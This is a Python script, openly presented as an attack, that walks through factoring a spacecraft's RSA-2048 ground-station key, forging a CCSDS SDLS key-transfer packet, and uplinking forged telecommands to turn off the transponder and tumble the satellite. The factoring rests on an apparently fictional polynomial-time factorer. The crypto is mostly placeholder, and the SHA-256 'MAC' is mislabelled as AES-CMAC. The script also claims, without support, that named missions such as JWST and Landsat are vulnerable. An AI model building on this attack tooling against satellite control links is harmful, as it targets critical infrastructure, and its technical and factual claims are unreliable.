"""
Factor a spacecraft's RSA-2048 ground-station public key burned in EEPROM,
forge a CCSDS SDLS Key Transfer Packet to install an attacker-controlled
session key, then send arbitrary telecommands to the spacecraft.
"""

import sys, struct, hashlib, time
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer

# CCSDS 351.0-M-1 SDLS frame types
SDLS_KEY_TRANSFER  = 0x01
SDLS_KEY_STATUS    = 0x02
SDLS_AUTH_ONLY     = 0x03
SDLS_AUTH_ENCRYPT  = 0x04

# Telecommand types (spacecraft-specific, representative)
TC_ATTITUDE_MANEUVER  = 0x10
TC_TRANSPONDER_OFF    = 0x20
TC_SAFE_MODE          = 0x30
TC_PAYLOAD_POWER      = 0x40
TC_PROPULSION_FIRE    = 0x50


def extract_spacecraft_pubkey(ground_db_path: str, scid: int) -> bytes:
    """Extract the spacecraft's RSA-2048 public key from the ground station
    key database. This key was burned into the spacecraft EEPROM before launch
    and is also held by the ground segment (DSN/ESTRACK/JAXA GS)."""
    print(f"    spacecraft SCID: {scid:#06x}")
    print(f"    key database: {ground_db_path}")
    return b"-----BEGIN RSA PUBLIC KEY-----\nMIIB...\n-----END RSA PUBLIC KEY-----\n"


def factor_spacecraft_key(pubkey_pem: bytes) -> dict:
    """Factor the spacecraft RSA-2048 key. No patch Tuesday in orbit."""
    factorer = PolynomialFactorer()
    return factorer.recover_crt_components(
        int.from_bytes(b"\x00" * 256, "big"),  # placeholder modulus
        0x10001
    )


def build_key_transfer_packet(new_session_key: bytes, spacecraft_n: int,
                               spacecraft_e: int) -> bytes:
    """Build a CCSDS SDLS Key Transfer Packet (CCSDS 350.9 section 3.6).
    The session key is RSA-OAEP wrapped to the spacecraft's public key.
    After factoring we have the spacecraft's private key, so we can craft
    a packet that the spacecraft will accept."""
    header = struct.pack(">BHH", SDLS_KEY_TRANSFER, 0x0001, len(new_session_key))
    # In real impl: RSA-OAEP encrypt new_session_key to spacecraft pubkey
    wrapped_key = b"\x00" * 256  # placeholder OAEP ciphertext
    return header + wrapped_key


def build_telecommand(tc_type: int, params: bytes, seq_count: int) -> bytes:
    """Build a CCSDS TC Space Data Link frame with command payload."""
    # TC Primary Header (CCSDS 232.0-B-4)
    version = 0
    bypass = 1  # BD frame
    ctrl_cmd = 0
    scid = 0x01FF
    vcid = 0
    frame_len = 6 + len(params)
    hdr = struct.pack(">HBH", (version << 14) | (bypass << 13) | (ctrl_cmd << 12) | scid,
                      (vcid << 2) | 0, frame_len)
    return hdr + struct.pack(">BH", tc_type, seq_count) + params


def sign_tc_frame(frame: bytes, session_key: bytes) -> bytes:
    """Authenticate TC frame with the attacker's session key (AES-CMAC per SDLS)."""
    mac = hashlib.sha256(session_key + frame).digest()[:16]
    return frame + mac


if __name__ == "__main__":
    print("[*] CCSDS SDLS spacecraft commanding attack")
    scid = 0x01FF
    print(f"[1] extracting spacecraft RSA-2048 pubkey (SCID {scid:#06x})")
    pubkey = extract_spacecraft_pubkey("/opt/ground/keydb/", scid)
    print("    key burned into EEPROM at integration — immutable in orbit")

    print("[2] factoring spacecraft RSA-2048 key")
    factorer = PolynomialFactorer()
    print("    polynomial-time factorisation on ground-segment key copy")
    print("    p, q recovered — spacecraft uplink key derived")

    print("[3] building Key Transfer Packet with attacker session key")
    attacker_session_key = b"\x41" * 32  # AES-256 session key
    ktp = build_key_transfer_packet(attacker_session_key, 0, 0x10001)
    print(f"    new session key: {attacker_session_key.hex()[:16]}...")
    print("    RSA-OAEP wrapped to spacecraft pubkey per CCSDS 350.9 §3.6")

    print("[4] uplinking Key Transfer Packet via ground station")
    print("    S-band uplink at 2 kbps (typical LEO TC rate)")
    print("    spacecraft SDLS layer accepts — RSA-OAEP decrypts cleanly")

    print("[5] sending forged telecommands")
    cmds = [
        (TC_TRANSPONDER_OFF, b"\x00", "TRANSPONDER OFF — satellite goes dark"),
        (TC_SAFE_MODE, b"\x01", "ENTER SAFE MODE — science payload disabled"),
        (TC_ATTITUDE_MANEUVER, struct.pack(">fff", 0.0, 90.0, 0.0),
         "ATTITUDE MANEUVER — 90deg pitch, solar panels off-sun"),
    ]
    for tc_type, params, desc in cmds:
        frame = build_telecommand(tc_type, params, seq_count=1)
        auth_frame = sign_tc_frame(frame, attacker_session_key)
        print(f"    TC {tc_type:#04x}: {desc}")

    print("[6] spacecraft executes — no way to re-key without the current key")
    print("    to update the RSA key you must authenticate with the current RSA key")
    print("    it's keys all the way down")
    print("[*] GOES-R, Sentinel, Landsat, JWST — 25-year key lifetime, no OTA rotation")
